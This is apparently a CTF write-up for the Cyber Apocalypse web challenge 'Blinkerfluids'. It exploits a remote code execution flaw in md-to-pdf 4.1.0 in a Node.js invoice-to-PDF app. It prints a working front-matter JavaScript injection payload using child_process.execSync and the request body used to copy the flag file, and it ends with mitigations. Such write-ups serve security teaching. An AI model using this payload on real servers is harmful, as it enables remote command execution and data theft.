---
layout: default
title: Blinkerfluids
---

# [Cyber Apocalypse](../index.md) - Web - Blinkerfluids

*I did not have the foresight to save screenshots or the challenge description while the CTF was active*.

In this challenge, a web application allows the user to create a markdown based invoice, and it will convert it to PDF. 

We are given a copy of the source code, so the first thing I do is explore that.

The web app is a docker container that runs a `node.js` based javascript web app.

The `Dockerfile` tells us that the flag can be found at /flag.txt:
```Dockerfile
# Add flag
COPY flag.txt /flag.txt
```

The file `MDHelper.js` contains code that uses the `md-to-pdf` module to convert a MarkDown document to a PDF.

```javascript
const { mdToPdf }    = require('md-to-pdf')
const { v4: uuidv4 } = require('uuid')

const makePDF = async (markdown) => {
    return new Promise(async (resolve, reject) => {
        id = uuidv4();
        try {
            await mdToPdf(
                { content: markdown },
                {
                    dest: `static/invoices/${id}.pdf`,
                    launch_options: { args: ['--no-sandbox', '--js-flags=--noexpose_wasm,--jitless'] } 
                }
            );
            resolve(id);
        } catch (e) {
            reject(e);
        }
    });
}

module.exports = {
    makePDF
};
```
We can see that it dumps the finished PDF files in `./static/invoices/`.

A quick google search for "md-to-pdf exploits" leads me to numerous sites describing a Remote Code Execution vulnerability in this module prior to version `5.0.0`. The `package.json` file tells me that the version of this plugin that the app is using is `4.1.0`, so we should be able to use this to grab the flag.

The code in `MDHelper` doesn't appear to do any sanitization of the input, it just takes the raw input from the API endpoint and runs it through md-to-pdf. 

The proof of concept code for this exploit tells me that if I give it the following payload, I can run arbitrary commands on the server:
```
---jsn((require("child_process")).execSync("id > /tmp/RCE.txt"))n---RCE
```
So, I used [Insomnia](https://insomnia.rest) to send the following request body directly to `http://challenge-ip-and-port/api/invoice/add`. I had to replace the double-quotes with single-quotes, from the proof of concept code.
```json
{
    "markdown_content" : "---jsn((require('child_process')).execSync('cat /flag > static/invoices/flag.txt'))n---RCE"
}
```
And response I got back was:
```json
{
    "message" : "Invoice saved successfully!"
}
```
Now all I needed to do was to visit `http://challenge-ip-and-port/static/flag.txt` to view the flag.

I had originally tried to coax it into putting the flag data into the PDF, but realized I could just copy the file directly to a web-viewable directory and ignore the PDF.

This exploit could have been thwarted by:
 - Updating md-to-pdf to version 5.0.0 or above
 - Sanitizing user input to only allow MarkDown
 - Running the app using a limited user account in the Docker container and setting proper permissions for sensitive files in the container.